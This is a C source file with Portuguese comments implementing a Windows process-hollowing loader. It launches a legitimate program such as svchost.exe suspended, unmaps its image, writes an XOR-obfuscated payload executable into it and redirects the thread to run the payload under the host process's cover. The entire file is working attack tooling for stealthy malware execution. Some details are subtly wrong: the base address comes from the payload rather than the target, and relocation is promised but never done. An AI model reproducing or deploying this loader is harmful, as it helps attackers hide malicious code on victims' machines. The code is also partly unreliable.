#include <windows.h>                // Contém a maioria das funções da API do Windows
#include <stdio.h>                  // Contém funções de entrada/saída
#include <winternl.h>               // Contém definições de estruturas e funções internas do Windows, não documentadas oficialmente.

#pragma comment(lib, "ntdll.lib")   // Diz ao compilador para linkar com a biblioteca ntdll.dll, onde reside NtUnmapViewOfSection.

// Definindo um "apelido" para um ponteiro de função.
// Estamos criando um tipo chamado pNtUnmapViewOfSection.
// Diz ao compilador para linkar com a biblioteca ntdll.dll, onde reside NtUnmapViewOfSection.
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

// Função para aplicar XOR no payload
// Ela é reversível: se você aplicar a mesma chave duas vezes, volta ao original (A XOR B XOR B = A).
void xor_encrypt_decrypt(BYTE *data, SIZE_T data_len, BYTE *key, SIZE_T key_len) {
    // Itera por cada byte do dado.
    for (SIZE_T i = 0; i < data_len; i++) {
        // Aplica a operação XOR entre o byte do dado e um byte da chave.
        // O operador '%' (módulo) faz a chave se repetir. Se a chave tem 16 bytes, o 17º byte do dado será operado com o 1º byte da chave, e assim por diante.
        data[i] ^= key[i % key_len];
    }
}

// Função para gerar chave XOR aleatória
// Não é criptograficamente segura, mas é suficiente para criar uma chave diferente a cada execução.
void generate_xor_key(BYTE *key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < key_len; i++) {
        // Combina um número pseudo-aleatório com o tempo de sistema para maior variabilidade.
        key[i] = (BYTE)(rand() ^ GetTickCount());
    }
}

int main(int argc, char* argv[]) {
    // 1. Validação de Entrada: Garante que o usuário forneceu os dois arquivos necessários.
    if (argc != 3) {
        printf("Uso: %s <caminho_para_payload.exe> <caminho_para_alvo.exe>\n", argv[0]);
        return -1;
    }

    const char* payloadPath = argv[1];
    const char* targetPath = argv[2];

    // Inicializa estruturas
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    // 2. Leitura do Payload do Disco:
    // Abre o arquivo do payload.
    HANDLE hPayload = CreateFileA(payloadPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        printf("Erro ao abrir payload: %lu\n", GetLastError());
        return -1;
    }

    // Obtém seu tamanho em bytes.
    DWORD payloadSize = GetFileSize(hPayload, NULL);
    if (payloadSize == INVALID_FILE_SIZE) {
        printf("Erro ao obter tamanho do payload: %lu\n", GetLastError());
        CloseHandle(hPayload);
        return -1;
    }

    // Aloca memória para armazenar o conteúdo do arquivo.
    BYTE* payloadBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    if (!payloadBuffer) {
        printf("Erro ao alocar memória para payload\n");
        CloseHandle(hPayload);
        return -1;
    }

    // Lê os bytes do arquivo para o buffer de memória.
    DWORD bytesRead;
    if (!ReadFile(hPayload, payloadBuffer, payloadSize, &bytesRead, NULL) || bytesRead != payloadSize) {
        printf("Erro ao ler payload: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        CloseHandle(hPayload);
        return -1;
    }
    // Fecha o arquivo, não precisamos mais dele.
    CloseHandle(hPayload);

    // 3. Ofuscação do Payload:
    BYTE xorKey[16];
    generate_xor_key(xorKey, sizeof(xorKey)); // Gera a chave.
    xor_encrypt_decrypt(payloadBuffer, payloadSize, xorKey, sizeof(xorKey)); // Aplica o XOR. Agora, `payloadBuffer` contém dados embaralhados.

    // 4. Análise da Estrutura do Payload (Headers PE):
    // Precisamos ler o "índice" (os headers) para saber como reconstruí-lo na memória do processo alvo.
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Payload não é um executável PE válido\n");
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Headers NT inválidos\n");
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Verificamos se o arquivo é realmente um executável 64-bits ou 32-bits.
    BOOL isTarget64Bit = ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;

    // 1. Criação do Processo Alvo em Estado Suspenso:
    // Esta é a instrução mais crítica da fase de preparação.
    // CREATE_SUSPENDED: O sistema operacional carrega o executável alvo (ex: svchost.exe) na memória,
    // prepara tudo para sua execução, mas pausa sua thread principal antes que a primeira instrução de código seja executada.
    // O processo existe, mas está "congelado".
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Erro CreateProcess: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // 2. Validação de Arquitetura:
    // É fundamental que o payload e o processo alvo tenham a mesma arquitetura (ambos 64-bit ou ambos 32-bit).
    // Injetar um código 64-bit em um processo 32-bit (ou vice-versa) resultará em falha imediata.
    // A função IsWow64Process verifica isso.
    BOOL isProcess64Bit;
    if (!IsWow64Process(pi.hProcess, &isProcess64Bit)) {
        printf("Erro ao verificar arquitetura do processo: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }
    if ((isTarget64Bit && isProcess64Bit) || (!isTarget64Bit && !isProcess64Bit)) {
        printf("Arquitetura compatível\n");
    } else {
        printf("Erro: Arquitetura do payload e do alvo não compatíveis\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // 1. Obtenção da Função de Desmapeamento:
    // Em vez de linkar estaticamente com NtUnmapViewOfSection,
    // obtemos seu endereço da memória em tempo de execução.
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("Erro ao obter handle da ntdll: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        printf("Erro ao resolver NtUnmapViewOfSection: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // 2. Leitura do Endereço Base do Alvo:
    // O header PE do alvo nos diz qual é seu endereço de memória "preferido" (ImageBase).
    LPVOID imageBase = (LPVOID)ntHeaders->OptionalHeader.ImageBase;
    // 3. Execução da Escavação:
    // Chamamos a função para remover o código original do processo alvo de seu espaço de memória.
    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, imageBase);
    // Neste ponto, o processo alvo está "oco". O espaço de memória onde seu código deveria estar foi liberado.
    if (!NT_SUCCESS(status)) {
        printf("Erro ao desmapear imagem: 0x%08X\n", status);
        // Prossegue, pois o endereço pode estar ocupado; tenta relocação
        imageBase = NULL;
    }

    // 1. Descriptografia do Payload:
    // O payload precisa ser escrito na memória em seu formato original, executável.
    // Aplicamos a mesma chave XOR novamente para reverter a ofuscação.
    xor_encrypt_decrypt(payloadBuffer, payloadSize, xorKey, sizeof(xorKey));

    // 2. Alocação de Nova Memória no Processo Alvo:
    // Pedimos ao SO para alocar um novo bloco de memória dentro do processo alvo.
    // Idealmente, no mesmo 'ImageBase' que acabamos de esvaziar.
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // `PAGE_READWRITE`: A memória é marcada como "pode ler e escrever".
    if (!remoteImage) {
        printf("Erro ao alocar memória remota: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // 3. Cópia do Payload para o Alvo (em partes):
    // Não copiamos tudo de uma vez. Um .exe é dividido em seções (.text, .data, .rsrc).
    // Copiamos os headers primeiro.
    if (!WriteProcessMemory(pi.hProcess, remoteImage, payloadBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("Erro ao copiar headers: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // Depois, copiamos cada seção individualmente para seu endereço virtual correto.
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID localAddr = payloadBuffer + section[i].PointerToRawData;
        LPVOID remoteAddr = (LPVOID)((LPBYTE)remoteImage + section[i].VirtualAddress);
        // Copia a seção.
        if (!WriteProcessMemory(pi.hProcess, remoteAddr, localAddr, section[i].SizeOfRawData, NULL)) {
            printf("Erro ao copiar seção %s: %lu\n", section[i].Name, GetLastError());
            // Após copiar, ajustamos as permissões de memória daquela seção.
            // Se for uma seção de código (.text), mudamos sua permissão para PAGE_EXECUTE.
            // Se for de dados (.data), para PAGE_READWRITE.
            // Isso mimetiza o comportamento normal de um processo.
            VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            HeapFree(GetProcessHeap(), 0, payloadBuffer);
            return -1;
        }

        // Ajusta permissões da seção
        DWORD protect = (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? PAGE_EXECUTE :
                        (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
        DWORD oldProtect;
        VirtualProtectEx(pi.hProcess, remoteAddr, section[i].SizeOfRawData, protect, &oldProtect);
    }

    // 1. Obtenção do Contexto da Thread:
    // Uma "CONTEXT" é uma fotografia do estado da CPU para uma thread específica.
    // Contém os valores de todos os registradores (RAX, RBX, RCX, etc.), incluindo
    // o mais importante: o ponteiro de instrução (RIP em 64-bit, EIP em 32-bit),
    // que diz qual é a próxima instrução a ser executada.
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("Erro ao obter contexto da thread: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // 2. Modificação do Ponto de Entrada:
    // A documentação do Windows para SetThreadContext em um processo recém-criado
    // indica que, em algumas versões, modificar diretamente RIP/EIP não funciona como esperado.
    // A forma documentada e mais compatível é escrever o novo endereço de memória
    // do ponto de entrada no registrador RCX (para 64 bits) ou ECX (para 32 bits).
    // O loader do sistema usará o valor deste registrador para iniciar a execução.
    if (isTarget64Bit) {
        ctx.Rcx = (ULONGLONG)((LPBYTE)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    } else {
        ctx.Ecx = (DWORD)((LPBYTE)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    }

    // 3. Aplicação do Contexto Modificado:
    // Enviamos a "fotografia" alterada de volta para a thread.
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("Erro ao definir contexto da thread: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    // 4. Retomada da Execução:
    // "Descongelamos" a thread.
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        // A thread agora vai começar a executar a partir do novo ponto de entrada que definimos,
        // que é o início do nosso payload, dentro da casca do processo legítimo.
        printf("Erro ao retomar thread: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteImage, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        HeapFree(GetProcessHeap(), 0, payloadBuffer);
        return -1;
    }

    printf("[+] Hollowing concluído. PID: %lu\n", pi.dwProcessId);

    // O código libera a memória alocada (payloadBuffer) e fecha os handles abertos
    // para o processo e a thread, para evitar vazamentos de recursos.
    HeapFree(GetProcessHeap(), 0, payloadBuffer);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
